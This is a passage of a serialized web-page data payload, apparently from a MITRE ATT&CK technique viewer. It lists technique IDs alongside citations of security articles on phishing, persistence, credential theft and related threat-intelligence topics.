2017.","DiginotarCompromise","https:\u002F\u002Fthreatpost.com\u002Ffinal-report-diginotar-hack-shows-total-compromise-ca-servers-103112\u002F77170\u002F",{},"T1588.003",{},"T1588.004",{},"T1588.005",{},"T1588.001",{},{},"T1588.006","CrowdStrike Outlook Forms","https:\u002F\u002Fmalware.news\u002Ft\u002Fusing-outlook-forms-for-lateral-movement-and-persistence\u002F13746","Parisi, T., et al. (2017, July). Using Outlook Forms for Lateral Movement and Persistence. Retrieved February 5, 2019.","Outlook Today Home Page","https:\u002F\u002Fmedium.com\u002F@bwtech789\u002Foutlook-today-homepage-persistence-33ea9b505943","Soutcast. (2018, September 14). Outlook Today Homepage Persistence. Retrieved February 5, 2019.",{},"T1137.006","GlobalDotName Jun 2019","https:\u002F\u002Fwww.221bluestreet.com\u002Fpost\u002Foffice-templates-and-globaldotname-a-stealthy-office-persistence-technique","Shukrun, S. (2019, June 2). Office Templates and GlobalDotName - A Stealthy Office Persistence Technique. Retrieved August 26, 2019.",{},"T1137.001",{},"T1137.002",{},"T1137.003",{},"T1137.004",{},"T1137.005","T1201","T1034","T1120",{},"T1069.003",{},"T1069.002",{},"T1069.001",{},"T1566.001","Spearphishing Attachment",{},"T1566.002","Spearphishing Link","Trend Micro Pawn Storm OAuth 2017","https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fpawn-storm-abuses-open-authentication-advanced-social-engineering-attacks","Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication in Advanced Social Engineering Attacks. Retrieved October 4, 2019.",{},"T1566.003","ThreatPost Social Media Phishing","https:\u002F\u002Fthreatpost.com\u002Ffacebook-launching-pad-phishing-attacks\u002F160351\u002F","O'Donnell, L. (2020, October 20). Facebook: A Top Launching Pad For Phishing Attacks. Retrieved October 20, 2020.","TrendMictro Phishing","https:\u002F\u002Fwww.trendmicro.com\u002Fen_us\u002Fresearch\u002F20\u002Fi\u002Ftricky-forms-of-phishing.html","Babon, P. (2020, September 3). Tricky 'Forms' of Phishing. Retrieved October 20, 2020.","PCMag FakeLogin","https:\u002F\u002Fwww.pcmag.com\u002Fnews\u002Fhackers-try-to-phish-united-nations-staffers-with-fake-login-pages","Kan, M. (2019, October 24). Hackers Try to Phish United Nations Staffers With Fake Login Pages. Retrieved October 20, 2020.","Sophos Attachment","https:\u002F\u002Fnakedsecurity.sophos.com\u002F2020\u002F10\u002F02\u002Fserious-security-phishing-without-links-when-phishers-bring-along-their-own-web-pages\u002F","Ducklin, P. (2020, October 2). Serious Security: Phishing without links – when phishers bring along their own web pages. Retrieved October 20, 2020.","GitHub Phishery","Ryan Hanson. (2016, September 24). phishery. Retrieved October 23, 2020.",{},"T1598.002",{},"T1598.003",{},"T1598.001","https:\u002F\u002Fwww.itworld.com\u002Farticle\u002F2853992\u002F3-tools-to-check-your-hard-drives-health-and-make-sure-its-not-already-dying-on-you.html","Pinola, M. (2014, December 14). 3 tools to check your hard drive's health and make sure it's not already dying on you. Retrieved October 2, 2018.","ITWorld Hard Disk Health Dec 2014",{},"T1542.003",{},"T1542.002",{},"T1542.004",{},"T1542.001",{},"T1542.005","T1057",{},"T1055.004",{},"T1055.001",{},"T1055.011",{},"T1055.002",{},"T1055.009",{},"T1055.013",{},"T1055.012",{},"T1055.008",{},"T1055.003",{},"T1055.005",{},"T1055.014","T1572",{},"T1090.004",{},"T1090.002",{},"T1090.001",{},"T1090.003","T1012","T1108","T1219","https:\u002F\u002Fmedium.com\u002F@networksecurity\u002Frdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6","Beaumont, K. (2017, March 19). RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an organisation. Retrieved December 11, 2017.","RDP Hijacking Medium","Breach Post-mortem SSH Hijack","https:\u002F\u002Fmatrix.org\u002Fblog\u002F2019\u002F05\u002F08\u002Fpost-mortem-and-remediations-for-apr-11-security-incident","Hodgson, M. (2019, May 8). Post-mortem and remediations for Apr 11 security incident. Retrieved February 17, 2020.",{},"T1563.002",{},"T1563.001","SSH Secure Shell","https:\u002F\u002Fwww.ssh.com\u002Fssh","SSH.COM. (n.d.). SSH (Secure Shell). Retrieved March 23, 2020.",{},"T1021.003",{},"T1021.001",{},"T1021.002","https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc787851.aspx","Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12, 2016.","TechNet RPC",{},"T1021.004",{},"T1021.005",{},"T1021.006","T1018","T1091","T1496","CloudSploit. (2019, June 8). The Danger of Unused AWS Regions. Retrieved October 8, 2019.","https:\u002F\u002Fblog.cloudsploit.com\u002Fthe-danger-of-unused-aws-regions-af0bf1b878fc","CloudSploit - Unused AWS Regions","T1207","T1014",{},"T1053.001",{},"T1053.002","https:\u002F\u002Ftwitter.com\u002Fleoloobeek\u002Fstatus\u002F939248813465853953","Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.","Twitter Leoloobeek Scheduled Task","https:\u002F\u002Fsocial.technet.microsoft.com\u002FForums\u002Fen-US\u002Fe5bca729-52e7-4fcb-ba12-3225c564674c\u002Fscheduled-tasks-history-retention-settings?forum=winserver8gen","Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.","TechNet Forum Scheduled Task Operational Setting","https:\u002F\u002Ftechnet.microsoft.com\u002Flibrary\u002Fdd315590.aspx","Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.","TechNet Scheduled Task Events","Microsoft Scheduled Task Events Win10","https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fsecurity\u002Fthreat-protection\u002Fauditing\u002Faudit-other-object-access-events","Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.",{},"T1053.007","Threat Matrix for Kubernetes","https:\u002F\u002Fwww.microsoft.com\u002Fsecurity\u002Fblog\u002F2020\u002F04\u002F02\u002Fattack-matrix-kubernetes\u002F","Weizman, Y. (2020, April 2). Threat Matrix for Kubernetes. Retrieved March 30, 2021.",{},"T1053.003",{},"T1053.004",{},"T1053.005",{},"T1053.006","T1029","T1113","T1064","D3Secutrity CTI Feeds","https:\u002F\u002Fd3security.com\u002Fblog\u002F10-of-the-best-open-source-threat-intelligence-feeds\u002F","Banerd, W. (2019, April 30). 10 of the Best Open Source Threat Intelligence Feeds. Retrieved October 20, 2020.","ZDNET Selling Data","https:\u002F\u002Fwww.zdnet.com\u002Farticle\u002Fa-hacker-group-is-selling-more-than-73-million-user-records-on-the-dark-web\u002F","Cimpanu, C. (2020, May 9). A hacker group is selling more than 73 million user records on the dark web. Retrieved October 20, 2020.",{},"T1597.002",{},"T1597.001","Medium SSL Cert","https:\u002F\u002Fmedium.com\u002F@menakajain\u002Fexport-download-ssl-certificate-from-server-site-url-bcfc41ea46a2","Jain, M. (2019, September 16). Export & Download — SSL Certificate from Server (Site URL). Retrieved October 20, 2020.","SSLShopper Lookup","https:\u002F\u002Fwww.sslshopper.com\u002Fssl-checker.html","SSL Shopper. (n.d.). SSL Checker. Retrieved October 20, 2020.","DigitalShadows CDN","https:\u002F\u002Fwww.digitalshadows.com\u002Fblog-and-research\u002Fcontent-delivery-networks-cdns-can-leave-you-exposed-how-you-might-be-affected-and-what-you-can-do-about-it\u002F","Swisscom & Digital Shadows. (2017, September 6). Content Delivery Networks (CDNs) Can Leave You Exposed – How You Might Be Affected And What You Can Do About It. Retrieved October 20, 2020.","Shodan","https:\u002F\u002Fshodan.io","Shodan. (n.d.). Shodan. Retrieved October 20, 2020.",{},"T1596.004",{},"T1596.001",{},"T1596.003",{},"T1596.005",{},"T1596.002","Cyware Social Media","https:\u002F\u002Fcyware.com\u002Fnews\u002Fhow-hackers-exploit-social-media-to-break-into-your-company-88e8da8e","Cyware Hacker News. (2019, October 2). How Hackers Exploit Social Media To Break Into Your Company. Retrieved October 20, 2020.","SecurityTrails Google Hacking","https:\u002F\u002Fsecuritytrails.com\u002Fblog\u002Fgoogle-hacking-techniques","Borges, E. (2019, March 5). Exploring Google Hacking Techniques. Retrieved October 20, 2020.","ExploitDB GoogleHacking","https:\u002F\u002Fwww.exploit-db.com\u002Fgoogle-hacking-database","Offensive Security. (n.d.). Google Hacking Database. Retrieved October 23, 2020.",{},"T1593.002",{},"T1593.001","https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA15-314A","US-CERT. (2015, November 13). Compromised Web Servers and Web Shells - Threat Awareness and Guidance. Retrieved June 8, 2016.","US-CERT Alert TA15-314A Web Shells",{},"T1505.001",{},"T1505.002",{},"T1505.003","T1489","T1129","T1051",{},"T1218.003","https:\u002F\u002Fgithub.com\u002Fapi0cradle\u002FUltimateAppLockerByPassList","Moe, O. (2018, March 1). Ultimate AppLocker Bypass List. Retrieved April 10, 2018.","GitHub Ultimate AppLocker Bypass List",{},"T1218.001",{},"T1218.002","https:\u002F\u002Fwww.trendmicro.de\u002Fcloud-content\u002Fus\u002Fpdfs\u002Fsecurity-intelligence\u002Fwhite-papers\u002Fwp-cpl-malware.pdf",{},"T1218.004",{},"T1218.005","https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F04\u002Ffin7-phishing-lnk.html","Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.","FireEye FIN7 April 2017",{},"T1218.007",{},"T1218.008",{},"T1218.009",{},"T1218.010",{},"T1218.011",{},"T1218.012",{},"T1216.001","T1072",{},"T1518.001","T1153","Volexity Ocean Lotus November 2020","https:\u002F\u002Fwww.volexity.com\u002Fblog\u002F2020\u002F11\u002F06\u002Foceanlotus-extending-cyber-espionage-operations-through-fake-websites\u002F","Adair, S. and Lancaster, T. (2020, November 6). OceanLotus: Extending Cyber Espionage Operations Through Fake Websites. Retrieved November 20, 2020.","Gallagher 2015","Gallagher, S.. (2015, August 5). Newly discovered Chinese hacking group hacked 100+ websites to use as “watering holes”. Retrieved January 25, 2016.","http:\u002F\u002Farstechnica.com\u002Fsecurity\u002F2015\u002F08\u002Fnewly-discovered-chinese-hacking-group-hacked-100-websites-to-use-as-watering-holes\u002F","Malwarebytes Silent Librarian October 2020","https:\u002F\u002Fblog.malwarebytes.com\u002Fmalwarebytes-news\u002F2020\u002F10\u002Fsilent-librarian-apt-phishing-attack\u002F","Malwarebytes Threat Intelligence Team. (2020, October 14). Silent Librarian APT right on schedule for 20\u002F21 academic year. Retrieved February 3, 2021.","Proofpoint TA407 September 2019","https:\u002F\u002Fwww.proofpoint.com\u002Fus\u002Fthreat-insight\u002Fpost\u002Fthreat-actor-profile-ta407-silent-librarian","Proofpoint Threat Insight Team. (2019, September 5). Threat Actor Profile: TA407, the Silent Librarian. Retrieved February 3, 2021.","DigiCert Install SSL Cert","https:\u002F\u002Fwww.digicert.com\u002Fkb\u002Fssl-certificate-installation.htm","DigiCert. (n.d.). How to Install an SSL Certificate. Retrieved April 19, 2021.",{},"T1608.004",{},"T1608.003",{},"T1608.005",{},"T1608.001",{},"T1608.002","T1528","Auth0. (n.d.). Why You Should Always Use Access Tokens to Secure APIs. Retrieved September 12, 2019.","https:\u002F\u002Fauth0.com\u002Fblog\u002Fwhy-should-use-accesstokens-to-secure-an-api\u002F","Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019","https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Factive-directory\u002Fdevelop\u002Faccess-tokens","T1539","Stealthbits Detect PtT 2019","https:\u002F\u002Fblog.stealthbits.com\u002Fdetect-pass-the-ticket-attacks","Jeff Warren. (2019, February 19). How to Detect Pass-the-Ticket Attacks. Retrieved February 27, 2020.","Microsoft Kerberos Golden Ticket","https:\u002F\u002Fgallery.technet.microsoft.com\u002Fscriptcenter\u002FKerberos-Golden-Ticket-b4814285","Microsoft. (2015, March 24). Kerberos Golden Ticket Check (Updated). Retrieved February 27, 2020.",{},"T1558.004","Medin, T. (2014, November). Attacking Kerberos - Kicking the Guard Dog of Hades. Retrieved March 22, 2018.","SANS Attacking Kerberos Nov 2014","https:\u002F\u002Fredsiege.com\u002Fkerberoast-slides",{},"T1558.001",{},"T1558.003",{},"T1558.002","https:\u002F\u002Fspecterops.io\u002Fassets\u002Fresources\u002FSpecterOps_Subverting_Trust_in_Windows.pdf","Graeber, M. (2017, September). Subverting Trust in Windows. Retrieved January 31, 2018.","SpectorOps Subverting Trust Sept 2017","https:\u002F\u002Fsecurelist.com\u002Fwhy-you-shouldnt-completely-trust-files-signed-with-digital-certificates\u002F68593\u002F","Ladikov, A. (2015, January 29). Why You Shouldn’t Completely Trust Files Signed with Digital Certificates. Retrieved March 31, 2016.","Securelist Digital Certificates","http:\u002F\u002Fwww.symantec.com\u002Fconnect\u002Fblogs\u002Fhow-attackers-steal-private-keys-digital-certificates","Shinotsuka, H. (2013, February 22). How Attackers Steal Private Keys from Digital Certificates. Retrieved March 31, 2016.","Symantec Digital Certificates","https:\u002F\u002Fposts.specterops.io\u002Fcode-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec","Graeber, M. (2017, December 22). Code Signing Certificate Cloning Attacks and Defenses. Retrieved April 3, 2018.","SpectorOps Code Signing Dec 2017",{},"T1553.002",{},"T1553.006",{},"T1553.001",{},"T1553.004","http:\u002F\u002Fwww.trendmicro.com\u002Fcloud-content\u002Fus\u002Fpdfs\u002Fsecurity-intelligence\u002Fwhite-papers\u002Fwp-finding-holes-operation-emmental.pdf","Sancho, D., Hacquebord, F., Link, R. (2014, July 22). Finding Holes Operation Emmental. Retrieved February 9, 2016.","Operation Emmental",{},"T1553.005",{},"T1553.003","https:\u002F\u002Fblog.avast.com\u002Fnew-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities","Avast Threat Intelligence Team. (2018, March 8). New investigations into the CCleaner incident point to a possible third stage that had keylogger capacities. Retrieved March 15, 2018.","Avast CCleaner3 2018","https:\u002F\u002Fwww.commandfive.com\u002Fpapers\u002FC5_APT_SKHack.pdf","Command Five Pty Ltd. (2011, September). SK Hack by an Advanced Persistent Threat. Retrieved April 6, 2018.","Command Five SK 2011","Trendmicro NPM Compromise","https:\u002F\u002Fwww.trendmicro.com\u002Fvinfo\u002Fdk\u002Fsecurity\u002Fnews\u002Fcybercrime-and-digital-threats\u002Fhacker-infects-node-js-package-to-steal-from-bitcoin-wallets","Trendmicro. (2018, November 29). Hacker Infects Node.js Package to Steal from Bitcoin Wallets. Retrieved April 10, 2019.",{},"T1195.003",{},"T1195.001",{},"T1195.002","T1082","T1614",{},"T1016.001","T1049","T1033","T1007",{},"T1569.001",{},"T1569.002","T1529","T1124","T1080","T1221","https:\u002F\u002Fwww.giac.org\u002Fpaper\u002Fgcih\u002F342\u002Fhandle-cd00r-invisible-backdoor\u002F103631","Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible backdoor. Retrieved October 13, 2018.","Hartrell cd00r 2002",{},"T1205.001","T1537",{},"T1127.001","T1199","T1111",{},"T1552.003",{},"T1552.005",{},"T1552.007","Unit 42 Unsecured Docker Daemons","https:\u002F\u002Funit42.paloaltonetworks.com\u002Fattackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed\u002F","Chen, J.. (2020, January 29). Attacker's Tactics and Techniques in Unsecured Docker Daemons Revealed. Retrieved March 31, 2021.",{},"T1552.001",{},"T1552.002",{},"T1552.006",{},"T1552.004","T1535",{},"T1550.001",{},"T1550.002","Stealthbits Overpass-the-Hash","https:\u002F\u002Fstealthbits.com\u002Fblog\u002Fhow-to-detect-overpass-the-hash-attacks\u002F","Warren, J. (2019, February 26). How to Detect Overpass-the-Hash Attacks. Retrieved February 4, 2021.",{},"T1550.003",{},"T1550.004",{},"T1204.002",{},"T1204.003",{},"T1204.001","CAPEC-560","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F560.html","https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fdn535501.aspx","Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016.","TechNet Credential Theft",{},"T1078.004",{},"T1078.001",{},"T1078.002",{},"T1078.003","T1125",{},"T1497.001",{},"T1497.003",{},"T1497.002",{},"T1600.002",{},"T1600.001",{},"T1102.002",{},"T1102.001",{},"T1102.003","T1047","T1220","Palo Alto Networks (Network Security AI Research Team)","Microsoft","orange","\u002F"));